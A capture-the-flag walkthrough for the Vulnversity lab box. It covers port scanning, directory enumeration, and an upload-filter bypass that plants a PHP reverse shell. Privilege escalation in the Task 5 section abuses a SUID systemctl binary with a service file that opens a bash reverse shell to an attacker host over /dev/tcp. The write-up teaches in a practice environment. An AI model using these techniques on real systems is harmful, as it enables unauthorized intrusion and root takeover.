## Walkthrough

<details><summary><strong>Full Walkthrough</strong></summary>

### Task 1

No questions, it just wants you to deploy the box.

### Task 2

#### Question 1

Does not require an answer, just an acknowledgment.

#### Question 2

![Vulnversity Task 1 Question 2](/assets/img/Vulnversity1.png)

This can be done with several different methods. I decided to run:

**`threader3000`** 

and enter the IP address of the box. This returned the following results, which is a total of **6** open ports.

![Vulnversity threader3000](/assets/img/Vulnversity2.png)

#### Question 3

This question asks for the version of the squid proxy running on the host. 

![Vulnversity Task 2 Question 3](/assets/img/Vulnversity3.png)

This can be figured out by letting threader3000 do its default nmap scan.

![Vulnversity nmap](/assets/img/Vulnversity4.png)

The version uncovered is **3.5.12** as shown above.

#### Question 4

![Vulnversity Task 2 Question 4](/assets/img/Vulnversity5.png)

This one was rather simple. If the **-p-400** flag is used, it scans ports 1-400, so the answer would be **400**.

#### Question 5

![Vulnversity Task 2 Question 5](/assets/img/Vulnversity6.png)

This was another rather simple question. The answer to this is **dns**. This can be found by running: 

**`nmap --help`** 

and looking for the -n flag under the HOST DISCOVERY section as shown below.

![Vulnversity nmap --help](/assets/img/Vulnversity7.png)

#### Question 6

![Vulnversity Task 2 Question 6](/assets/img/Vulnversity8.png)

This can be found with the results of the nmap scan for Question 3, which is **Ubuntu**. This can also be done by running:

**`sudo nmap -O <ip address> --osscan-guess`**

#### Question 7

![Vulnversity Task 2 Question 7](/assets/img/Vulnversity9.png)

This can also easily be found out from the results of Question 3. It shows that Apache is running on port **3333**.

This can also be found out by running:

**`nmap -sV <ip address>`**

#### Question 8

This is another acknowledgment that you should do proper reconnaissance and just requires you to mark it complete.

### Task 3

#### Question 1

No answer is needed, this just wants you to acknowledge you read the information on gobuster.

#### Question 2

![Vulnversity Task 3 Question 2](/assets/img/Vulnversity10.png)

Let's utilize gobuster for this by running:

**`gobuster dir -u http://<target ip>:3333 -w /usr/share/wordlists/dirb/common.txt`**

This will soon return several results. 

![Vulnversity gobuster](/assets/img/Vulnversity11.png)

Let's take a look at the **/internal/** path of the website in our browser.

![Vulnversity website /internal/](/assets/img/Vulnversity12.png)

This is the location of the file uploader.

### Task 4

#### Question 1

![Vulnversity Task 4 Question 1](/assets/img/Vulnversity13.png)

After some trial and error, it appears that .php files are blocked as shown below.

![Vulnversity shell.php upload](/assets/img/Vulnversity14.png)

#### Question 2

This question has no required answer and just wants you to acknowledge that you have a basic understanding of Burp Suite.

#### Question 3

![](/assets/img/Vulnversity15.png)

For this question, let's create the extension list provided. First, lets run:

**`nano phpext.txt`**

Once here, add in the following extensions and save the file.

![Vulnversity PHP extensions](/assets/img/Vulnversity16.png)

Next, start up Burp Suite and have it intercept traffic with the proxy (which is on by default). Refresh the page with the **/internal/** directory and allow this traffic to be forwarded. Next, try to upload a [reverse PHP shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) that has been modified to add in your IP address and port of your choosing.

You should see a screen similar to the one below that is being uploaded

![Vulnversity Burp Suite 1](/assets/img/Vulnversity17.png)

Next, right click and click on **Send to Intruder** and then click on the **Intruder** tab and then the **Positions** section:

![Vulnversity Burp Suite 2](/assets/img/Vulnversity18.png)

Next, click on the **Clear ยง** button to remove all of the payload positions that were automatically added. Next, highlight the **.php** extension of the shell.php file name and click on **Add ยง** button.

![Vulnversity Burp Suite 3](/assets/img/Vulnversity19.png)

Next, click on the **Payloads** section and under **Payload Options** click on the **Load ...** button. Navigate to the **phpext.txt** file you created and click on **Open**.

![Vulnversity Burp Suite 4](/assets/img/Vulnversity20.png)

Next, at the bottom of the page, uncheck the **URL-encode these characters:"** box and then click on **Start Attack**.

A response window should appear, and there is one that has a shorter length than the rest (.phtml) Let's take a look at that response and by clicking on it and then clicking on **Response**.

![Vulnversity Burp Suite 5](/assets/img/Vulnversity21.png)

You will notice that this says **Success**, which means this file upload type is allowed. This tells us that **.phtml** files are allowed which answers this question.

#### Question 4

I sort of jumped the gun and we had already downloaded the recommended PHP reverse shell, so you can skip most of this section. The only thing you would need to do is on your attacker host, run:

**`nc -nvlp <port number>`** to catch the reverse shell. Where the port number is the one you defined in the reverse shell file.

![Vulnversity nc listener](/assets/img/Vulnversity22.png)

Next, in your browser, navigate to **http://\<target IP address>:3333/internal/uploads/shell.phtml**. In a few moments you should have a shell onto the victim machine.

![Vulnversity initial foothold](/assets/img/Vulnversity23.png)

#### Question 5

![Vulnversity Task 4 Question 5](/assets/img/Vulnversity24.png)

This question is answered rather easily. Let's run:

**`cd /home`**

followed by

**`ls`**

and you should get the following result which answers this question as there is only one home directory listed (**bill**).



![Vulnversity user name](/assets/img/Vulnversity25.png)

#### Question 6



![Vulnversity Task 4 Question 6](/assets/img/Vulnversity26.png)

For this, let's take a look in bill's home folder. Since we're already in the **/home** directory, let's just type in:

**`cd bill`**

and then follow this up with:

**`ls`**

the user.txt file should be present here, which can be displayed with:

**`cat user.txt`**

![Vulnversity user flag](/assets/img/Vulnversity27.png)

### Task 5

#### Question 1

![Vulnversity Task 5 Question 1](/assets/img/Vulnversity28.png)

There are several different ways to find the answer to this question. The one provided in the hint is not the most efficient method, as it does not filter out error messages. Let's utilize this command instead:

**`find / -user root -perm -4000 -print 2>/dev/null`**

This will find all SUID files and send the error messages to /dev/null so they are not displayed on your screen. This gives us a much shorter list of items to look at.

![Vulnversity SUID files](/assets/img/Vulnversity29.png)

One that stands out is **systemctl**, which can be utilized with privilege escalation. The answer to this question is **/bin/systemctl**.

#### Question 2

![Vulnversity Task 5 Question 2](/assets/img/Vulnversity30.png)

[GTFOBins ](https://gtfobins.github.io/gtfobins/systemctl/) has a pretty good guide on how to get root by abusing the systemctl SUID. The example they provide shows you how to run the id command as root, which is not really useful to us. Let's modify the command listed to the following:

Before running this, on our attacker computer, let's run the following:

**`nc -nvlp 4242`**

![Vulnversity nc listener root shell](/assets/img/Vulnversity31.png)

This will be utilized to catch the bash shell after running the command below.

**`sudo install -m =xs $(which systemctl) .`**

**`TF=$(mktemp).service`**
**`echo '[Service]`**
**`Type=oneshot`**
**`ExecStart=/bin/bash -c "bash -i >& /dev/tcp/<attacker ip>/4242 0>&1"`**
**`[Install]`**
**`WantedBy=multi-user.target' > $TF`**
**`./systemctl link $TF`**
**`./systemctl enable --now $TF`**

![Vulnversity systemctl abuse](/assets/img/Vulnversity32.png)

Next, let's run:

**`/bin/systemctl start /tmp/tmp.<randomly generated characters>.service`**

![Vulnversity systemctl start](/assets/img/Vulnversity33.png)

If you go back to your listener on port 4242, you should now have a root shell!

![Vulnversity root shell](/assets/img/Vulnversity34.png)

Now, we can run the following to navigate to the root user's home directory, list the contents, and print out the root flag:

**`cd /root`**

**`ls`**

**`cat root.txt`**

![Vulnversity root flag](/assets/img/Vulnversity35.png)
